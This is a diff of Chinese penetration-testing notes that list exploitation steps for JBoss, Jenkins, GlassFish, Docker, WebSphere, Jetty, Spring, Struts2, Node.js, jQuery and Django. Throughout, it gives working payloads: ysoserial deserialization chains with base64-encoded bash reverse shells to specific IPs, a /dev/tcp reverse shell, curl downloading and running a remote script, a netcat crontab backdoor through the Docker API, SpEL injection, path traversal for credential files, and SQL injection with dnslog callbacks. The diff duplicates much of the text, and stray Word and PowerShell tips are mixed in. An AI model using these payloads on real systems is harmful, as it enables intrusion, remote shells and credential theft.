class="line">并运行。设定目录之后直接解析为jsp文件，连接到webshell。</span><br></pre></td></tr></table></figure>
-<h1 id="cve-2020-4450-无利用pocexp"><a class="markdownIt-Anchor" href="#cve-2020-4450-无利用pocexp">#</a> CVE- 2020 - 4450 ：无利用 POC/EXP</h1>
-<h4 id="3310-jetty文件读取漏洞"><a class="markdownIt-Anchor" href="#3310-jetty文件读取漏洞">#</a> 3.3.10 jetty 文件读取漏洞</h4>
-<p>Elipse Jetty 是一个开源的 servlet 容器，它为基于 Java 的 Web 容器提供运行<br>
-环境。此中间件存在文件读取漏洞，但是读取的信息用处不大。<br>
-CVE- 2021 - 28164 <span class="exturl" data-url="aHR0cDovLzEyMy41OC4yMzYuNzY6NjMxMjYvJTJlL1dFQi1JTkYvd2ViLnhtbA==">http://123.58.236.76:63126/%2e/WEB-INF/web.xml</span><br>
-CVE- 2021 - 28169 <span class="exturl" data-url="aHR0cDovLzEyMy41OC4yMzYuNzY6NjMxMjYvc3RhdGljPy9XRUItSU5GL3dlYi54bWw=">http://123.58.236.76:63126/static?/WEB-INF/web.xml</span><br>
-CVE- 2021 - 34429 <span class="exturl" data-url="aHR0cDovLzEyMy41OC4yMzYuNzY6NjMxMjYvJTI1dTAwMmUvV0VCLUlORi93ZWIueG1s">http://123.58.236.76:63126/%u002e/WEB-INF/web.xml</span></p>
-<p>| 关于 pwsh 的一些基本操作</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">检查当前的powershell版本：$PSVersionTable.PSVersion</span><br><span class="line">安装最新版的powershell方法：</span><br><span class="line">https://learn.microsoft.com/en-us/powershell/scripting/install/installing-</span><br><span class="line">powershell?view=powershell-7.2</span><br><span class="line">键盘打开管理员权限的powershell： 按windows 键，然后输入pwsh，然后同时按 按</span><br><span class="line">Ctrl+ Shift + Enter 键。再弹出的对话框中选择是，就可以弹出管理员权限的pwsh。</span><br></pre></td></tr></table></figure>
-<p>| word 批量替换 [x] 为上标的方法</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ctrl+h调出查找与替换模块，选择高级替换与查找，</span><br><span class="line">查找内容勾选为使用通配符、内容填写\[[0-9]&#123;1,3&#125;\]并且不限定格式，</span><br><span class="line">替换后的内容不填但是要选择字符格式中的上标格式。选择全部替换就可以改掉了。</span><br><span class="line">\[[0-9]&#123;1,2&#125;\](适用两位编号，三位为&#123;1,3&#125;) 即\[[0-9]&#123;1,3&#125;\]</span><br><span class="line">\[[0-9]&#123;1,2&#125;?[0-9]&#123;1,2&#125;\](适用两位编号，三位为&#123;1,3&#125;)即\[[0-9]&#123;1,2&#125;?[0-9]&#123;1,3&#125;\](</span><br></pre></td></tr></table></figure>
-<p>| word 引用自定义目录的方法</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">先将自己的标题统一设置为样式-这里选择以标题 3 ， 4 ， 5 作为自己的一二三级目录</span><br><span class="line">引用目录-自定义目录-选择目录深度（需显示两级目录则选择为 4 ，即显示设置的一二）</span><br><span class="line">选择修改目录中的TOC3、TOC4依次进行修改</span><br><span class="line">TOC3即原本的标题 3 是自己想要展示的一级目录，我设置了新罗马小四字，段落前后</span><br><span class="line">间距 0 行，是1.5倍行距</span><br><span class="line">TOC4即原本的标题 4 是自己想要展示的二级目录，我设置了新罗马 11 字，段落前间距</span><br><span class="line">0 行，段落缩进0.5cm，固定 20 磅行距</span><br></pre></td></tr></table></figure>
-<h3 id="34-框架安全"><a class="markdownIt-Anchor" href="#34-框架安全">#</a> 3.4 框架安全</h3>
-<p>根据插件及数据包中识别框架，但是不一定准确，多识别几次确定。</p>
-<h4 id="341-php框架-thinkphp-laravel"><a class="markdownIt-Anchor" href="#341-php框架-thinkphp-laravel">#</a> 3.4.1 PHP 框架 - thinkphp laravel</h4>
-<p>当确定是 php 框架，直接用集成化工具一把梭。就是一个收集信息，确定<br>
-此版本下的漏洞，寻找工具直接利用的一个过程。可以用 GUI_tools 测试。<br>
-Laravel &lt;= 8.4.2 存在 CVE- 2021 - 3129 RCE<br>
-Thinkphp-3.X RCE-5.X RCE 存在 RCE<br>
- 框架的漏洞是固定的，没有就是没有，自己去挖也不太现实，只能把注意<br>
-力放在其他的财产目标上；其他的也没漏洞那就只能去社工、钓鱼从管理方面<br>
-下手了。</p>
-<h4 id="342-java框架-spring-struts2"><a class="markdownIt-Anchor" href="#342-java框架-spring-struts2">#</a> 3.4.2 JAVA 框架 - Spring Struts2</h4>
-<p>在 java 代码漏洞利用中，需要注意要使用 base 64 编码来反弹 shell。原因是<br>
-由于 Runtime.getRuntime ().exec () 中不能使用管道符等 bash 需要的方法，故需要<br>
-用进行一次编码。</p>
-<p>（ 1 ）St 2 漏洞：</p>
-<p>2020 前漏洞，当识别到一个 url 地址后缀是 action 结尾，就可以尝试用 St 2<br>
- 的集成化工具测试直接 getshell；后面的版本修复了此漏洞，但有 s 2 - 062 存在<br>
- cve_2020_17530、cve_2021_31805，可以直接利用脚本 https://github.com/YanMu<br>
-2020/s 2 - 062 实现 RCE。关于原理与手工复现还是有一定难度的，应该是尽快确<br>
-定此框架存在漏洞直接利用。</p>
-<p>（ 2 ）Spring 漏洞：</p>
-<p>参考链接：<span class="exturl" data-url="aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL3NwcmluZy8lRTMlODAlODI=">https://vulhub.org/#/environments/spring/。</span><br>
-cve_2017_4971-Spring Web Flow-<span class="exturl" data-url="aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzMyMi8=">https://paper.seebug.org/322/</span><br>
- 大致是通过 Spring 在 17 年的默认页面进行操作从而 RCE</p>
-<p>cve_2018_1273-Spring DataCommons -<br>
-<span class="exturl" data-url="aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL3NwcmluZy9DVkUt">https://vulhub.org/#/environments/spring/CVE-</span> 2018 - 1273/</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">攻击者可以注入恶意 SpEL表达式以执行任意命令，在用户注册界面抓包修改数据，注</span><br><span class="line">意不好判断是否RCE，需要dnslog测试/代码全部编码/反弹shell命令编码都进行测试。</span><br><span class="line">username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;touch</span><br><span class="line">/tmp/success&quot;)]=&amp;password=&amp;repeatedPassword=</span><br><span class="line">* 命令注入编码时需要拿出去单独编码防止空格的干扰</span><br><span class="line">Spring Data Commons 远程命令执行漏洞（CVE- 2018 - 1273 ）</span><br><span class="line">https://vulhub.org/#/environments/spring/CVE- 2022 - 22963/</span><br><span class="line">Connection: close spring.cloud.function.routing-expression:</span><br><span class="line">T(java.lang.Runtime).getRuntime().exec(&quot;touch /tmp/success&quot;)</span><br><span class="line">抓包修改要执行的命令，注意此处不需要编码，其不在post数据中</span><br></pre></td></tr></table></figure>
-<h4 id="343-javascript框架nodejsjquery"><a class="markdownIt-Anchor" href="#343-javascript框架nodejsjquery">#</a> 3.4.3 javascript 框架 node.js/jquery</h4>
-<p>（ 1 ）Node.js 目录穿越漏洞（CVE- 2017 - 14849 ）</p>
-<p>复现地址：<span class="exturl" data-url="aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL25vZGUvQ1ZFLQ==">https://vulhub.org/#/environments/node/CVE-</span> 2017 - 14849/<br>
- 用来读取一些敏感文件：GET /static/…/…/…/a/…/…/…/…/etc/passwd HTTP/1.1<br>
- 在 node.js &lt;= 8 .5 存在此漏洞，如果版本高就不用测了，版本找不到可以直接测</p>
-<p>（ 2 ）node.js cve_2021_21315</p>
-<p>Node.js-systeminformation 是用于获取各种系统信息的 Node.js 模块，在存在命令</p>
-<p>注入漏洞的版本中，可以通过未过滤的参数中注入 payload 执行系统命令。<br>
-Systeminformation &lt; 5.3.1<br>
- 复现地址：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vdnVscy8yODQzNTAuaHRtbA==">https://www.freebuf.com/vuls/284350.html</span><br>
-git clone <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZvcmJpZGRlblByb2dyYW1tZXIvQ1ZFLQ==">https://github.com/ForbiddenProgrammer/CVE-</span> 2021 - 21315 - PoC.git &amp;&amp; node index.js<br>
-/api/getServices?name[]=$(echo -e ‘xiaodi’ &gt; test.txt)</p>
-<p>（ 3 ）jQuery cve_2018_9207 cve_2018_9208 cve_2018_9209</p>
-<p>jQuery 是一个快速、简洁的 JavaScript 框架，如果与 php 配合使用且采用 jq<br>
- 来传文件，当 jQuery Upload File &lt;= 4.0.2 满足时存在任意文件上传，向 jq 中<br>
- post php 可 RCE: curl -F “myfile=@php.php” “<span class="exturl" data-url="aHR0cDovLzEyMy41OC4yMzYuNzY6NTY1NzkvanF1ZXJ5LQ==">http://123.58.236.76:56579/jquery-</span><br>
-upload-file/php/upload.php”</p>
-<h4 id="344-python框架django-flask"><a class="markdownIt-Anchor" href="#344-python框架django-flask">#</a> 3.4.4 python 框架 django flask</h4>
-<p>Django 是一款广为流行的开源 web 框架，由 Python 编写，许多网站和 app<br>
- 都基于 Django 开发。Django 采用了 MTV 的框架模式，即模型 M，视图 V 和模<br>
-版 T，使用 Django，程序员可以方便、快捷地创建高品质、易维护、数据库驱<br>
-动的应用程序。而且 Django 还包含许多功能强大的第三方插件，使得 Django 具<br>
-有较强的可扩展性。<br>
-前期的信息收集是很重要的，收集到的信息越多，暴露的资产面就越多，<br>
-搜集到的框架是 diango 的话就可以着手搜它历年爆出来的 RCE 尝试利用。</p>
-<p>（ 1 ）django cve_2019_14234</p>
-<p>注意触发此漏洞的前提条件是需要拿到后台权限，如果不能凭借弱口令或<br>
-者爆破进入后台，那就不能利用这个漏洞了。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">单引号已注入成功，SQL语句报错：/admin/vuln/collection/?detail__a%27b=123</span><br><span class="line">创建cmd_exec：/admin/vuln/collection/?detail__title%27)%</span><br><span class="line">3d%271%27%20or%201%3d1%20%3bcreate%20table%20cmd_exec(cmd_output%20text)-</span><br></pre></td></tr></table></figure>
+<p>漏洞链接: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Z1bGh1Yi92dWxodWIvdHJlZS9tYXN0ZXIvamJvc3MvQ1ZFLTIwMTctMTIxNDk=">https://github.com/vulhub/vulhub/tree/master/jboss/CVE-2017-12149</span></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">我们使用bash来反弹shell，但由于Runtime.getRuntime().<span class="built_in">exec</span>()中不能使用管道符等bash需要的方法，我们需要用进行一次编码。</span></span><br><span class="line">java -jar ysoserial.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTAuNDIuMTc4LjIyNy8zNDUxMiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; poc.ser</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成好的POC即为poc.ser，将这个文件作为POST Body发送至/invoker/readonly</span></span><br><span class="line">curl http://110.42.178.227:8080/invoker/readonly --data-binary @poc.ser</span><br></pre></td></tr></table></figure>
 <ul>
-<li>%20<br>
- 调用 cmd_exec 执行命令，用 dnslog 接收回显判断是否存在命令执行：<br>
-/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcopy%20c<br>
-md_exec%20FROM%20PROGRAM%20%27ping <span class="exturl" data-url="aHR0cDovL2hxcndzei5kbnNsb2cuY24=">hqrwsz.dnslog.cn</span>%27–%20</li>
+<li>CVE-2017-7504</li>
 </ul>
-<p>（ 2 ）django CVE- 2021 - 35042</p>
+<p>漏洞复现过程与上差不多，唯一区别在于数据发送地址</p>
+<p><code>curl http://47.94.236.117:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @1.ser</code></p>
+<h4 id="jenkins-相关漏洞"><a class="markdownIt-Anchor" href="#jenkins-相关漏洞">#</a> Jenkins 相关漏洞</h4>
+<p>探针默认端口: 8080 ，Jenkins 是一个开源软件项目，是基于 Java 开发的一种持续集成工具，用于监控持续重复的工作。</p>
+<p>（1）cve_2017_1000353</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">利用条件未知，即便是JDK-1.8.0_291 版本也失效了</span></span><br><span class="line">wget https://github.com/vulhub/CVE-2017-1000353/releases/download/1.1/CVE-2017-1000353-1.1-SNAPSHOT-all.jar</span><br><span class="line">java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTAuNDIuMTc4LjIyNy8zNDUxMiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"></span><br><span class="line">wget https://github.com/vulhub/CVE-2017-1000353/archive/refs/heads/master.zip</span><br><span class="line">python exploit.py http://110.42.178.227:8080 jenkins_poc.ser</span><br></pre></td></tr></table></figure>
+<p>（2）CVE-2018-1000861</p>
+<p>漏洞链接:<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FkYW15b3JkYW4vY3ZlLTIwMTktMTAwMzAwMC1qZW5raW5zLXJjZS1wb2M=">https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc</span></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cat &gt; /tmp/1.txt &lt;&lt; EOF</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/1.117.52.219/4444 0&gt;&amp;1</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">python3 -m http.server 1389</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">利用脚本poc在vulhub靶场自带的启动环境中就有</span></span><br><span class="line">python2 poc.py http://110.42.178.227:8080/ &quot;curl -o /tmp/1.sh http://1.117.52.219: 1389 / 1 .txt&quot;</span><br><span class="line">python2 poc.py http://110.42.178.227:8080/ &quot;bash /tmp/1.sh&quot;</span><br></pre></td></tr></table></figure>
+<p>（3）CVE_2019_100300</p>
+<p>漏洞链接: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FkYW15b3JkYW4vY3ZlLTIwMTktMTAwMzAwMC1qZW5raW5zLXJjZS1wb2M=">https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc</span></p>
+<p>需要用户帐号密码，可以进行用户名枚举与爆破的方法测试</p>
+<h4 id="glassfish-弱口令-信息泄露"><a class="markdownIt-Anchor" href="#glassfish-弱口令-信息泄露">#</a> glassfish 弱口令 信息泄露</h4>
+<p>探针默认端口：4848，GlassFish 是一款强健的商业兼容应用服务器</p>
+<p>CVE-2017-1000028: 可以获取到后台密码以及主机上的文件内容</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">读密码</span></span><br><span class="line"><span class="meta prompt_">/theme/METAINF/%</span><span class="language-bash">c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./domains/domain1/config/admin-keyfile</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">读windows文件</span></span><br><span class="line"><span class="meta prompt_">/theme/META-INF/prototype%</span><span class="language-bash">c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c 0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">读linux文件</span></span><br><span class="line"><span class="meta prompt_">/theme/META-INF/%</span><span class="language-bash">c0%ae%c0%ae/%c0%ae%c0%ae/%c0%a e%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c 0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd</span></span><br></pre></td></tr></table></figure>
+<h4 id="docker-逃逸"><a class="markdownIt-Anchor" href="#docker-逃逸">#</a> docker 逃逸</h4>
+<p>Docker 容器是使用沙盒机制，是单独的系统，理论上是很安全的，通过利 用某种手段，再结合执行 POC 或 EXP，就可以返回一个宿主机的高权限 Shell， 并拿到宿主机的 root 权限。它从容器中逃了出来，因此我们形象的称为 Docker 逃逸漏洞。</p>
+<p>判断当前是在 docker 还是在宿主机上：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> 如果是在docker内部会有信息返回，否则提示没有此文件夹及文件</span></span><br><span class="line">ls -alh /.dockerenv</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在docker内部显示的内容比较多，否则显示的内容比较少</span></span><br><span class="line">cat /proc/1/cgroup </span><br></pre></td></tr></table></figure>
+<p>docker daemon api 未授权访问漏洞:</p>
+<p>漏洞链接:<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Z1bGh1Yi92dWxodWIvYmxvYi9tYXN0ZXIvZG9ja2VyL3VuYXV0aG9yaXplZC1yY2UvUkVBRE1FLnpoLWNuLm1k">https://github.com/vulhub/vulhub/blob/master/docker/unauthorized-rce/README.zh-cn.md</span></p>
+<p>利用方法是，我们随意启动一个容器， 并将宿主机的 /etc 目录挂载到容器中，便可以任意读写文件了。我们可以将命令写入 crontab 配置文件，进行反弹 shell。2375 端口开放，并且未授权。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import docker</span><br><span class="line">client = docker.DockerClient(base_url=&#x27;http://your-ip:2375/&#x27;)</span><br><span class="line">data = client.containers.run(&#x27;alpine:latest&#x27;, r&#x27;&#x27;&#x27;sh -c &quot;echo &#x27;* * * * * /usr/bin/nc your-ip 21 -e /bin/sh&#x27; &gt;&gt; /tmp/etc/crontabs/root&quot; &#x27;&#x27;&#x27;, remove=True, volumes=&#123;&#x27;/etc&#x27;: &#123;&#x27;bind&#x27;: &#x27;/tmp/etc&#x27;, &#x27;mode&#x27;: &#x27;rw&#x27;&#125;&#125;)</span><br></pre></td></tr></table></figure>
+<h4 id="websphere-反序列化"><a class="markdownIt-Anchor" href="#websphere-反序列化">#</a> websphere 反序列化</h4>
+<p>WebSphere® Application Server 加速交付新应用程序和服务，它可以通过快 速交付创新的应用程序来帮助企业提供丰富的用户体验从基于开放标准的丰富 的编程模型中进行选择，更好地协调项目需求与编程模型功能和开发人员技能。</p>
+<p>端口：9080—web (http) 应用访问端口、9443—web (https) 应用访问端口、 9060— 管理后台访问端口、9043— 管理控制台安全端口、8880—SOAP 连接器 端口等等。漏洞探测在 8880 端口，后台是 9060 端口，解析是 9080 端口。</p>
+<ul>
+<li>CVE-2015-7450</li>
+</ul>
+<p>后台弱口令上传 webshell，在 6.x 至 7.0 版本，后台登陆只需要输入 admin 作为用户标 识，无需密码，即可登陆后台。其他版本可以尝试 websphere 的默认密码。后台存在文 件上传点，同 tomcat 一样，可用哥斯拉导出 jsp 后门压缩为 zip 后改为 war，再后台上传 并运行。设定目录之后直接解析为 jsp 文件，连接到 webshell。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker pull iscrosales/websphere7</span><br><span class="line">docker run -d -p 9060:9060 -p 9043:9043 -p 8880:8880 -p 9080:9080 iscrosales/websphere7</span><br><span class="line">CVE-2015-7450 反序列化 可命令执行直接用exp执行命令</span><br></pre></td></tr></table></figure>
+<ul>
+<li>CVE-2020-4450 无利用 POC/EXP</li>
+</ul>
+<h4 id="jetty-文件读取"><a class="markdownIt-Anchor" href="#jetty-文件读取">#</a> jetty 文件读取</h4>
+<p>Elipse Jetty 是一个开源的 servlet 容器，它为基于 Java 的 Web 容器提供运行 环境。此中间件存在文件读取漏洞，但是读取的信息用处不大。</p>
+<p>CVE-2021-28164 <span class="exturl" data-url="aHR0cDovLzEyMy41OC4yMzYuNzY6NjMxMjYvJTJlL1dFQi1JTkYvd2ViLnhtbA==">http://123.58.236.76:63126/./WEB-INF/web.xml</span></p>
+<p>CVE-2021-28169 <span class="exturl" data-url="aHR0cDovLzEyMy41OC4yMzYuNzY6NjMxMjYvc3RhdGljPy9XRUItSU5GL3dlYi54bWw=">http://123.58.236.76:63126/static?/WEB-INF/web.xml</span></p>
+<p>CVE-2021-34429 <span class="exturl" data-url="aHR0cDovLzEyMy41OC4yMzYuNzY6NjMxMjYvJTI1dTAwMmUvV0VCLUlORi93ZWIueG1s">http://123.58.236.76:63126/%u002e/WEB-INF/web.xml</span></p>
+<h3 id="框架安全"><a class="markdownIt-Anchor" href="#框架安全">#</a> 框架安全</h3>
+<p>根据插件及数据包中识别框架，但是不一定准确，多识别几次确定。</p>
+<h4 id="thinkphp-laravel"><a class="markdownIt-Anchor" href="#thinkphp-laravel">#</a> Thinkphp Laravel</h4>
+<p>当确定是 php 框架，直接用集成化工具一把梭。就是一个收集信息，确定 此版本下的漏洞，寻找工具直接利用的一个过程。可以用 GUI_tools 测试。</p>
+<p>Laravel &lt;= 8.4.2 存在 CVE-2021-3129 RCE</p>
+<p>Thinkphp-3.X RCE-5.X RCE 存在 RCE 框架的漏洞是固定的，没有就是没有，自己去挖也不太现实，只能把注意力放在其他的财产目标上；其他的也没漏洞那就只能去社工、钓鱼从管理方面 下手了。</p>
+<h4 id="spring-struts2"><a class="markdownIt-Anchor" href="#spring-struts2">#</a> Spring Struts2</h4>
+<p>在 java 代码漏洞利用中，需要注意要使用 base64 编码来反弹 shell。原因是 由于 Runtime.getRuntime ().exec () 中不能使用管道符等 bash 需要的方法，故需要 用进行一次编码。</p>
+<p>（1）St2 漏洞</p>
+<p>2020 前漏洞，当识别到一个 url 地址后缀是 action 结尾，就可以尝试用 St2 的集成化工具测试直接 getshell; 后面的版本修复了此漏洞，但有 s2-062 存在 cve_2020_17530、cve_2021_31805，可以直接利用脚本 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1lhbk11">https://github.com/YanMu</span> 2020/s2-062 实现 RCE。关于原理与手工复现还是有一定难度的，应该是尽快确 定此框架存在漏洞直接利用。</p>
+<p>（2）Spring 漏洞</p>
+<p>参考链接：<span class="exturl" data-url="aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL3NwcmluZy8lRTMlODAlODI=">https://vulhub.org/#/environments/spring/。</span></p>
+<p>cve_2017_4971-Spring Web Flow-<span class="exturl" data-url="aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzMyMi8lRTUlQTQlQTclRTglODclQjQlRTYlOTglQUYlRTklODAlOUElRTglQkYlODdTcHJpbmclRTUlOUMlQTg=">https://paper.seebug.org/322 / 大致是通过 Spring 在</span> 17 年的默认页面进行操作从而 RCE</p>
+<p>cve_2018_1273-Spring DataCommons - <span class="exturl" data-url="aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL3NwcmluZy9DVkUtMjAxOC0xMjczLw==">https://vulhub.org/#/environments/spring/CVE-2018-1273/</span></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">攻击者可以注入恶意 SpEL表达式以执行任意命令，在用户注册界面抓包修改数据，注意不好判断是否RCE，需要dnslog测试/代码全部编码/反弹shell命令编码都进行测试。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">命令注入编码时需要拿出去单独编码防止空格的干扰</span></span><br><span class="line"><span class="meta prompt_">username[#</span><span class="language-bash">this.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getRuntime().<span class="built_in">exec</span>(<span class="string">&quot;touch /tmp/success&quot;</span>)]=&amp;password=&amp;repeatedPassword=</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Spring Data Commons 远程命令执行漏洞（CVE-2018-1273 ）</span></span><br><span class="line">https://vulhub.org/#/environments/spring/CVE-2022-22963/</span><br><span class="line">Connection: close spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&quot;touch /tmp/success&quot;)</span><br><span class="line">抓包修改要执行的命令，注意此处不需要编码，其不在post数据中</span><br></pre></td></tr></table></figure>
+<h4 id="nodejs-jquery"><a class="markdownIt-Anchor" href="#nodejs-jquery">#</a> Node.js Jquery</h4>
+<p>（1）Node.js 目录穿越漏洞（CVE-2017-14849 ）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">复现地址：</span></span><br><span class="line">https://vulhub.org/#/environments/node/CVE-2017-14849/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">用来读取一些敏感文件：</span></span><br><span class="line">GET /static/../../../a/../../../../etc/passwd HTTP/1.1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在node.js &lt;= 8 .5存在此漏洞，如果版本高就不用测了，版本找不到可以直接测</span></span><br></pre></td></tr></table></figure>
+<p>（2）node.js CVE_2021_21315</p>
+<p>Node.js-systeminformation 是用于获取各种系统信息的 Node.js 模块，在存在命令注入漏洞的版本中，可以通过未过滤的参数中注入 payload 执行系统命令。<br>
+Systeminformation &lt; 5.3.1</p>
+<p>复现地址：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vdnVscy8yODQzNTAuaHRtbA==">https://www.freebuf.com/vuls/284350.html</span></p>
+<p><code>git clone https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC.git &amp;&amp; node index.js /api/getServices?name[]=$(echo -e 'xiaodi' &gt; test.txt)</code></p>
+<p>（3）jQuery cve_2018_9207 cve_2018_9208 cve_2018_9209</p>
+<p>jQuery 是一个快速、简洁的 JavaScript 框架，如果与 php 配合使用且采用 jq 来传文件，当 jQuery Upload File &lt;= 4.0.2 满足时存在任意文件上传，向 jq 中 post php 可 RCE:<br>
+ <code>curl -F &quot;myfile=@php.php&quot; &quot;http://123.58.236.76:56579/jquery-upload-file/php/upload.php&quot;</code></p>
+<h4 id="django-flask"><a class="markdownIt-Anchor" href="#django-flask">#</a> Django Flask</h4>
+<p>Django 是一款广为流行的开源 web 框架，由 Python 编写，许多网站和 app 都基于 Django 开发。Django 采用了 MTV 的框架模式，即模型 M，视图 V 和模 版 T，使用 Django，程序员可以方便、快捷地创建高品质、易维护、数据库驱 动的应用程序。而且 Django 还包含许多功能强大的第三方插件，使得 Django 具 有较强的可扩展性。</p>
+<p>前期的信息收集是很重要的，收集到的信息越多，暴露的资产面就越多， 搜集到的框架是 diango 的话就可以着手搜它历年爆出来的 RCE 尝试利用。</p>
+<p>（1）django cve_2019_14234</p>
+<p>注意触发此漏洞的前提条件是需要拿到后台权限，如果不能凭借弱口令或者爆破进入后台，那就不能利用这个漏洞了。</p>
